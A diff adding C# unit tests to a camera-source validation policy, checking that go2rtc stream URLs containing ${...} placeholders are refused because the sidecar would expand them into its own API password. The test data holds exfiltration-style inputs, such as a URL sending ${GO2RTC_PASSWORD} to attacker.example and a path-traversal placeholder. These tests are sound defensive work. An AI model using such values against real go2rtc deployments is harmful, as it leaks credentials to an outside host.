@@ -241,6 +241,61 @@ public class CameraSourcePolicyTests
     }
 
     /// <summary>
+    /// A source naming one of the sidecar's own settings is refused, wherever in the source it sits.
+    /// </summary>
+    /// <remarks>
+    /// go2rtc expands <c>${NAME}</c> in its configuration file each time it loads it, from its
+    /// environment and its credentials directory - which is where the API password is mounted. A
+    /// source is written into that file as typed, so the placeholder becomes the secret, sent to
+    /// whichever host the rest of the source names. The resolver answers with a public address, so
+    /// nothing but the placeholder is left to refuse these.
+    /// </remarks>
+    [Theory]
+    [InlineData("http://attacker.example/${GO2RTC_PASSWORD}")]
+    [InlineData("rtsp://camera.example/live?token=${GO2RTC_PASSWORD}")]
+    [InlineData("rtsp://admin:${GO2RTC_PASSWORD}@camera.example/live")]
+    [InlineData("http://camera.example/${../../etc/hostname}")]
+    [InlineData("rtsp://camera.example/live#media=${X}")]
+    [InlineData("ffmpeg:device?video=/dev/v4l/by-id/${X}&input_format=mjpeg")]
+    public async Task ASourceNamingASidecarSettingIsRefused(string source)
+    {
+        CameraSourcePolicy policy = Build();
+
+        CameraSourceCheck check = await policy.CheckAsync(source, CancellationToken.None);
+
+        check.IsAcceptable.Should().BeFalse("the sidecar would replace the placeholder with its own secret");
+        check.Error!.Key.Should().Be("Cameras_SourcePlaceholder");
+    }
+
+    /// <summary>Not an address rule, so turning the address rules off does not turn it off.</summary>
+    [Fact]
+    public async Task ASidecarSettingIsRefusedWithTheAddressChecksOff()
+    {
+        CameraSourcePolicy policy = Build(refuseLoopback: false);
+
+        CameraSourceCheck check = await policy.CheckAsync("http://attacker.example/${GO2RTC_PASSWORD}", CancellationToken.None);
+
+        check.IsAcceptable.Should().BeFalse();
+        check.Error!.Key.Should().Be("Cameras_SourcePlaceholder");
+    }
+
+    /// <summary>
+    /// A dollar sign on its own is not a placeholder, and passwords have them - as does a brace the
+    /// user percent-encoded, which the sidecar decodes only after its configuration is loaded.
+    /// </summary>
+    [Theory]
+    [InlineData("rtsp://admin:pa$$word@camera.example/live")]
+    [InlineData("rtsp://admin:pa%24%7Bx%7D@camera.example/live")]
+    public async Task ADollarThatIsNotAPlaceholderIsAccepted(string source)
+    {
+        CameraSourcePolicy policy = Build();
+
+        CameraSourceCheck check = await policy.CheckAsync(source, CancellationToken.None);
+
+        check.IsAcceptable.Should().BeTrue();
+    }
+
+    /// <summary>
     /// Homespool's container identity - the name it answers to inside the Compose network.
     /// </summary>
     [Fact]
